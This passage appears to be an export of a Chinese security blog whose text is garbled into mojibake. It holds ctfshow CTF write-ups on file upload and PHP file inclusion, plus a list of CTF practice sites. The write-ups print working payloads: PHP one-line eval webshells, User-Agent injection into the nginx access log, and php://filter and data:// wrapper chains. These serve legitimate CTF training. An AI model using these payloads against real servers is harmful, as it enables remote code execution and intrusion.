<p>phpä¸­ï¼Œåå¼•å·**&#96;**å¯ä»¥ç”¨æ¥æ‰§è¡Œç»ˆç«¯å‘½ä»¤ã€‚</p>
</blockquote>
<p>å› æ­¤å†™å…¥**<?= `cat fl*`?>**æ¥æ‰§è¡Œå‘½ä»¤ã€‚å¾—åˆ°flagã€‚</p>
<h3 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h3><p>ç»è¿‡æµ‹è¯•å‘ç°åå¼•å· &#96;å’Œç©ºæ ¼ä¹Ÿè¢«è¿‡æ»¤äº†ã€‚çœ‹åˆ°åˆ«äººçš„wpåæ‰çŸ¥é“åŸæ¥å¯ä»¥ä¸Šä¼ åˆ°æ—¥å¿—é‡Œï¼Œä½†æ˜¯logè¢«è¿‡æ»¤äº†ã€‚phpé‡Œå¯ä»¥ç”¨**.<strong>æ¥æ‹¼æ¥logã€‚çŸ¥é“severä¸ºnginx,æ—¥å¿—æ–‡ä»¶é»˜è®¤æ”¾åœ¨</strong>&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<strong>é‡Œã€‚<br>æ‰€ä»¥æœ‰æ€è·¯äº†ã€‚<br>é¦–å…ˆä¸Šä¼ </strong>.user.ini**ï¼Œç„¶åä¸Šä¼ 2.pngæ–‡ä»¶å†™å…¥<?=include"/var/lo"."g/niginx.access.lo"."g"?> åŒæ—¶UAæ”¹ä¸ºä¸€å¥è¯æœ¨é©¬ã€‚<br>ç¨åèšå‰‘è¿å…¥url&#x2F;upload&#x2F;<br><img src="https://img-blog.csdnimg.cn/6a94f2203af149be8e487afe9fe74dd9.png" alt="1"><br>å³å¯æŸ¥æ‰¾flagã€‚<br><img src="https://img-blog.csdnimg.cn/e4b85afb4d144b9785e81f42c99bc3f2.png" alt="2"></p>
<h3 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h3><p>ä¸ä¸Šé¢˜ä¸åŒçš„æ˜¯è¿›è¡Œäº†æ–‡ä»¶å¤´çš„éªŒè¯ï¼Œåªéœ€åœ¨æ–‡ä»¶å¤´åŠ ä¸ŠGIF89aï¼Œå…¶ä»–å’Œä¸Šé¢˜ä¸€æ ·ã€‚<br>èšå‰‘è¿æ¥å¾—åˆ°flagã€‚</p>
<h2 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h2><h3 id="web-78"><a href="#web-78" class="headerlink" title="web 78"></a>web 78</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 10:52:43
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 10:54:20
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>payloadï¼š<code>http://56337a28-b2ea-474e-b82d-03c38b2e75f1.challenge.ctf.show/?file=php://filter/convert.base64-encode/resource=flag.php</code></p>
<p>PD9waHANCg0KLyoNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIEBBdXRob3I6IGgxeGENCiMgQERhdGU6ICAgMjAyMC0wOS0xNiAxMDo1NToxMQ0KIyBATGFzdCBNb2RpZmllZCBieTogICBoMXhhDQojIEBMYXN0IE1vZGlmaWVkIHRpbWU6IDIwMjAtMDktMTYgMTA6NTU6MjANCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQ0KIyBAbGluazogaHR0cHM6Ly9jdGZlci5jb20NCg0KKi8NCg0KDQokZmxhZz0iY3Rmc2hvd3tmYTljNGExYS01NzE1LTQwOGEtYWU0Yy00ZGU2NzRiM2M4YzZ9Ijs&#x3D;<br>è§£å¯†å¾—åˆ°flagï¼šctfshow{fa9c4a1a-5715-408a-ae4c-4de674b3c8c6}</p>
<h3 id="web-79"><a href="#web-79" class="headerlink" title="web 79"></a>web 79</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:10:14
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 11:12:38
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>str_replace</strong>å‡½æ•°ï¼š</p>
<blockquote>
<p>è¯­æ³•</p>
<p>str_replace(find,replace,string,count)</p>
<p>å‚æ•° 	æè¿° find 	å¿…éœ€ã€‚è§„å®šè¦æŸ¥æ‰¾çš„å€¼ã€‚ replace 	å¿…éœ€ã€‚è§„å®šæ›¿æ¢ find ä¸­çš„å€¼çš„å€¼ã€‚ string<br>    å¿…éœ€ã€‚è§„å®šè¢«æœç´¢çš„å­—ç¬¦ä¸²ã€‚ count 	å¯é€‰ã€‚å¯¹æ›¿æ¢æ•°è¿›è¡Œè®¡æ•°çš„å˜é‡ã€‚</p>
</blockquote>
<p>å¯ä»¥ä½¿ç”¨dataåè®®å¯¹å†…å®¹è¿›è¡Œbase64åŠ å¯†**?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,[base64_encode_shell]**<br>åŠ å¯†å†…å®¹ä¸ºsystem(â€˜cat flag.phpâ€™);</p>
<h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 11:26:29
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>dataä¸èƒ½ç”¨äº†ã€‚<br>è¿™é‡Œåˆå­¦åˆ°ä¸€ä¸ª<strong>åŒ…å«æ—¥å¿—æ–‡ä»¶getshell</strong></p>
<blockquote>
<p>ä¸­é—´ä»¶çš„æ—¥å¿—æ–‡ä»¶ä¼šä¿å­˜ç½‘ç«™çš„è®¿é—®è®°å½•,æ¯”å¦‚<strong>HTTPè¯·æ±‚è¡Œ</strong>,<strong>User-Agent</strong>,<strong>Referer</strong>ç­‰å®¢æˆ·ç«¯ä¿¡æ¯<br>å¦‚æœåœ¨HTTPè¯·æ±‚ä¸­æ’å…¥æ¶æ„ä»£ç ,é‚£ä¹ˆæ¶æ„ä»£ç å°±ä¼šä¿å­˜åˆ°æ—¥å¿—æ–‡ä»¶ä¸­,è®¿é—®æ—¥å¿—æ–‡ä»¶çš„æ—¶å€™,æ—¥å¿—æ–‡ä»¶ä¸­çš„æ¶æ„ä»£ç å°±ä¼šæ‰§è¡Œ,ä»è€Œé€ æˆä»»æ„ä»£ç æ‰§è¡Œç”šè‡³è·å–shell<br>æ¯”å¦‚ä½¿ç”¨ä»£ç†å·¥å…·æŠ“åŒ…,åœ¨HTTPè¯·æ±‚ä¸­æ’å…¥ä¸€å¥è¯æœ¨é©¬,è®¿é—®æ—¥å¿—æ–‡ä»¶æ—¶ä¼šæ‰§è¡Œä¸€å¥è¯æœ¨é©¬,ç„¶åä½¿ç”¨èšå‰‘ç­‰å·¥å…·é“¾æ¥,ä»è€Œgetshell</p>
</blockquote>
<blockquote>
<p>nginx å¸¸ç”¨çš„é…ç½®æ–‡ä»¶æœ‰ä¸¤ç§ï¼š access.log å’Œ error.log</p>
<p>access.log çš„ä½œç”¨æ˜¯ è®°å½•ç”¨æˆ·æ‰€æœ‰çš„è®¿é—®è¯·æ±‚ï¼Œä¸è®ºçŠ¶æ€ç ï¼ŒåŒ…æ‹¬200<br>ï¼Œ404,500ç­‰è¯·æ±‚ï¼Œ404,500çš„è¯·æ±‚å¹¶ä¸ä¼šå‡ºç°åœ¨error.logä¸­ã€‚</p>
<p>error.log çš„ä½œç”¨æ˜¯ è®°å½•nginx<br>æœ¬èº«è¿è¡Œæ—¶çš„ä¸€äº›é”™è¯¯ï¼Œä¸ä¼šè®°å½•ç”¨æˆ·è®¿é—®çš„è¯·æ±‚ã€‚æ¯”å¦‚è®°å½•æ¨¡å—é”™è¯¯ä¿¡æ¯æ—¥å¿—ï¼Œä»¥åŠnginxé…ç½®æ–‡ä»¶çš„é”™è¯¯æ—¥å¿—ç­‰ï¼Œæ ¼å¼ä¸æ”¯æŒè‡ªå®šä¹‰ï¼Œå¯ä»¥è®¾ç½®çº§åˆ«ã€‚</p>
</blockquote>
<p>è®¿é—®æ—¶æ·»åŠ UAå¤´éƒ¨ï¼š**<? eval($_POST[0]);?>**<br>åœ¨<strong>url&#x2F;?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</strong>é‡Œï¼Œç„¶åä¸€å¥è¯æœ¨é©¬é“¾æ¥å¾—åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/fa64c532e0954f498c7d91e961397e8a.png" alt="1"></p>
<h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">è°ˆä¸€è°ˆphp:&#x2F;&#x2F;filterçš„å¦™ç”¨</a></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 21:57:55
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/</span>

<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'content'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"&lt;?php die('å¤§ä½¬åˆ«ç§€äº†');?>"</span><span class="token operator">.</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><code>php</code>,<code>data</code>,<code>;</code>,<code>.</code>,éƒ½è¢«è¿‡æ»¤äº†ï¼Œå¹¶ä¸”è¾“å‡ºçš„å†…å®¹ä¼šè¿›è¡Œurlè§£ç ï¼Œå› æ­¤æˆ‘ä»¬è¦å¯¹å‚æ•°è¿›è¡Œ2æ¬¡urlç¼–ç ã€‚<br>å¯ä»¥ä½¿ç”¨filteråè®®<strong>å†™å…¥</strong>æ–‡ä»¶<strong>a.php</strong>å³<code>php://filter/write=convert.base64-decode/resource=a.php</code>ä½†æ˜¯è¿™æ®µå†…å®¹éœ€è¦è¿›è¡Œ2æ¬¡urlç¼–ç ã€‚ä¹Ÿå°±æ˜¯<code>%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%36%31%25%32%65%25%37%30%25%36%38%25%37%30</code></p>
<blockquote>
<p>POSTå†…å®¹è¿›è¡Œbase-64ç¼–ç ã€‚<code>content=11PD9waHAgZXZhbCgkX1BPU1RbMV0pOw==</code><br>å…¶ä¸­PD9waHAgZXZhbCgkX1BPU1RbMV0pOw&#x3D;&#x3D;æ˜¯â€<?php eval($_POST[1]);"çš„base64ç¼–ç ã€‚
å‰é¢çš„11æ˜¯ä¸ºäº†å¡«å……"<?php die('å¤§ä½¬åˆ«ç§€äº†');?>â€œ<br>base64 4ä½4ä½è§£ç ï¼Œå…¶ä¸­â€<?php die('å¤§ä½¬åˆ«ç§€äº†');?>â€œè§£ç çš„å†…å®¹å…¶å®åªæœ‰phpdieï¼Œæ‰€ä»¥éœ€è¦å†å¡«å……ä¸¤ä½ã€‚<br>&#x2F;&#x2F;content&#x3D;&lt;?php eval($_POST[1]);</p>
</blockquote>
<blockquote>
<p>Base64ï¼Œé¡¾åæ€ä¹‰ï¼Œå°±æ˜¯åŒ…æ‹¬å°å†™å­—æ¯a-zã€å¤§å†™å­—æ¯A-Zã€æ•°å­—0-9ã€ç¬¦å·â€+â€ã€â€&#x2F;â€œä¸€å…±64ä¸ªå­—ç¬¦çš„å­—ç¬¦é›†</p>
</blockquote>
<h3 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-17 02:27:25
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

 */</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/php|\~|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\-|\_|\+|\=|\./i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿‡æ»¤äº†phpï¼Œfilteråè®®ä¸èƒ½ç”¨äº†ï¼Œinputåè®®ä¹Ÿä¸èƒ½ç”¨ï¼Œä½†æ˜¯dataåè®®å¯ä»¥ã€‚<br><code>?file=data://text/plain;base64,PD9waHAgZXZhbCgkX1BPU1RbMV0pOw</code><br><strong>PD9waHAgZXZhbCgkX1BPU1RbMV0pOwæ˜¯&lt;?php eval($_POST[1]); base64ç¼–ç </strong><br><img src="https://img-blog.csdnimg.cn/fc1a66afe139471382895274c504e75d.png" alt="1"><br>æ‰§è¡ŒæˆåŠŸã€‚</p>
<h3 id="web116"><a href="#web116" class="headerlink" title="web116"></a>web116</h3><p>å‘ç°è¦ä¸‹è½½æ–‡ä»¶ï¼Œä¸‹è½½ä¹‹ååŸæ¥æ˜¯mp4æ–‡ä»¶ï¼Œæ’­æ”¾åˆ°åé¢å‘ç°æœ‰é—®é¢˜ï¼Œé¢˜ç›®æç¤ºè¯´MISCï¼‹æ–‡ä»¶åŒ…å«ã€‚é‚£æˆ‘å°±æ”¾å…¥<strong>010</strong>ä¸­çœ‹çœ‹<br><img src="https://img-blog.csdnimg.cn/b100906ba2694fbe8d53b7a163903b95.png" alt="1">å‘ç°æœ‰pngæ–‡ä»¶ï¼Œæå–å‡ºæ¥å‘ç°æºç ã€‚<br><img src="https://img-blog.csdnimg.cn/8b318b0abf324bbcb4eec8e76dfd1898.png#pic_center" alt="2">ç›´æ¥è¯»å–flagã€‚<br><img src="https://img-blog.csdnimg.cn/acc29cf5ea3542709099b5f9ddbf55ce.png" alt="1"></p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>åˆ·é¢˜ç½‘ç«™å’Œåšé¢˜å·¥å…·</title>
    <url>/2022/12/09/%E5%88%B7%E9%A2%98%E7%BD%91%E7%AB%99/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>ä»Šå¤©æˆ‘æ¨èä¸€äº›å­¦ä¹ ä¿¡æ¯å®‰å…¨æ‰€ç”¨çš„åˆ·é¢˜å¹³å°ï¼š<br>1ï¼š Bugku : <a href="https://ctf.bugku.com/">https://ctf.bugku.com/</a><br>2ï¼š CTFHub : <a href="https://www.ctfhub.com/#/index">https://www.ctfhub.com/#/index</a><br>3ï¼š NSSCTF : <a href="https://www.ctfer.vip/index">https://www.ctfer.vip/index</a><br>4ï¼š æ”»é˜²ä¸–ç•Œ : <a href="https://adworld.xctf.org.cn/home/index">https://adworld.xctf.org.cn/home/index</a><br>5ï¼š BUUCTF : <a href="https://buuoj.cn/">https://buuoj.cn/</a><br>6ï¼š ctfshow : <a href="https://ctf.show/">https://ctf.show/</a><br>è¿˜æœ‰ä¸€ä¸ªæ¸…åå¤§å­¦å¼€æºè½¯ä»¶é•œåƒç«™ï¼š<a href="https://mirrors.tuna.tsinghua.edu.cn/">https://mirrors.tuna.tsinghua.edu.cn/</a>   é‡Œé¢æœ‰ä¸€äº›è™šæ‹Ÿæœºçš„é•œåƒæ–‡ä»¶å’Œä¸€äº›å¥½ç”¨çš„å·¥å…·ï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹ã€‚<br>ä¸€äº›åšctfé¢˜æ—¶å¯èƒ½è¦ç”¨çš„å·¥å…·ï¼š<br>1ï¼š CTFåœ¨çº¿å·¥å…·ï¼š<a href="http://www.hiencode.com/">http://www.hiencode.com/</a><br>2ï¼š é’ˆå¯¹md5ã€sha1ç­‰å…¨çƒé€šç”¨å…¬å¼€çš„åŠ å¯†ç®—æ³•è¿›è¡Œåå‘æŸ¥è¯¢ï¼Œé€šè¿‡ç©·ä¸¾å­—ç¬¦ç»„åˆçš„æ–¹å¼ï¼Œåˆ›å»ºäº†æ˜æ–‡å¯†æ–‡å¯¹åº”æŸ¥è¯¢æ•°æ®åº“ï¼Œåˆ›å»ºçš„è®°å½•çº¦90ä¸‡äº¿æ¡ï¼Œå ç”¨ç¡¬ç›˜è¶…è¿‡500TBï¼ŒæŸ¥è¯¢æˆåŠŸç‡95%ä»¥ä¸Šï¼Œå¾ˆå¤šå¤æ‚å¯†æ–‡åªæœ‰æœ¬ç«™æ‰å¯æŸ¥è¯¢ã€‚è‡ª2006å¹´å·²ç¨³å®šè¿è¡Œåä½™å¹´ï¼Œå›½å†…å¤–äº«æœ‰ç››èª‰ã€‚ ï¼š<a href="https://www.cmd5.com/">https://www.cmd5.com/</a><br>3ï¼š é‡Œé¢æœ‰å„ç§å·¥å…·   <a href="http://www.wetools.com/">å¾®å·¥å…·</a></p>
<p>4ï¼š <a href="https://phpinfo.me/domain">åœ¨çº¿å­åŸŸåæŸ¥è¯¢å·¥å…·</a></p>
<p>ä»Šå¤©å°±åˆ°è¿™ï¼Œä»¥åæˆ‘ä¼šåˆ†äº«æ›´å¤šæœ‰ç”¨çš„ä¸œè¥¿ã€‚æ•¬è¯·æœŸå¾…â€¦â€¦</p>
]]></content>
      <categories>
        <category>å°å·¥å…·</category>
      </categories>
      <tags>
        <tag>ç½‘ç«™</tag>
      </tags>
  </entry>
</search>
